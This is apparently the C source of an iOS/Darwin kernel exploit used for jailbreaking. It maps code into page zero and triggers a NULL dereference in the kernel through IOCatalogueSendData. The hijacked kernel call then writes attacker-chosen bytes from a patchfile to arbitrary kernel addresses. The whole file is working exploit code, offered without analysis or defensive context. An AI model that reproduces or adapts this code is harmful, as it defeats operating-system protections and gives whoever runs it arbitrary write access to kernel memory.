#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdbool.h>
#include <assert.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <syslog.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <mach/mach.h>

#undef assert
#define assert(x) do { if(!(x)) failz(__LINE__); } while(0)


kern_return_t IOCatalogueSendData(mach_port_t masterPort, uint32_t flag, const char *buffer, uint32_t size);
static const uint32_t kIOCatalogAddDrivers = 1;
static const int kIOMasterPortDefault = 0;

static void failz(int line) {
    line += 10000;
    sysctlbyname("net.inet6.ip6.hdrnestlimit", NULL, 0, &line, sizeof(line));
    setenv("DYLD_INSERT_LIBRARIES", "", 1);
    execl("/sbin/launchd", "/sbin/launchd", NULL);
}

static void *patchfile;
static size_t patchfile_size;
static int patches_made;
static bool ok_go_invoked;

__attribute__((used, naked, section("__ZERO,__pagezero"))) static inline void annoying() {
    asm volatile("b _ok_go");
}

__attribute__((used, section("__ZERO,__pagezero"))) static inline bool xread(void *ptr, size_t size) {
    if(size > patchfile_size) {
        patchfile_size = 0;
        return false;
    }
    patchfile_size -= size;
    char *source = patchfile;
    if(ptr) {
        char *dest = ptr;
        while(size--) {
            *dest++ = *source++;
        }
    } else {
        source += size;
    }
    patchfile = source;
    return true;
}

__attribute__((used, section("__ZERO,__pagezero")))
void *ok_go() { // actually dict->getObject
    ok_go_invoked = true;
    while(patchfile_size != 0) {
        // hey, it's a buffer overflow
        char name[128];
        name[0] = 0;
        uint32_t namelen, addr, datalen;
        xread(&namelen, sizeof(namelen)) &&
        xread(name, namelen) &&
        xread(&addr, sizeof(addr)) &&
        xread(&datalen, sizeof(datalen)) &&
        xread(name[0] == '-' ? NULL : (void *) addr, datalen) &&
        patches_made++;
    }
    return NULL;

}

int main() {
    int fd = open("/usr/share/jailbreak/cur/patchfile", O_RDONLY);
    assert(fd != -1);
    off_t off = lseek(fd, 0, SEEK_END);
    assert(off != -1 && off < 1048576);
    patchfile_size = (size_t) off;
    patchfile = mmap(NULL, patchfile_size, PROT_READ, MAP_SHARED, fd, 0);
    assert(patchfile);

    assert(!mlock(patchfile, patchfile_size));
    assert(!mlock((void *) 0, 0x1000));

    //execl("/sbin/lunchd", "/sbin/lunchd", NULL);
    
    const char *str = "<array><data></data></array>";
    assert(!IOCatalogueSendData(kIOMasterPortDefault, kIOCatalogAddDrivers, str, strlen(str)));

    assert(ok_go_invoked);

    syslog(LOG_INFO, "made %d kernel patches", patches_made);
        
    // turn this fancy stuff back on
    int one = 1;
    assert(!sysctlbyname("security.mac.vnode_enforce", NULL, 0, &one, sizeof(one)));

    return 0;
}
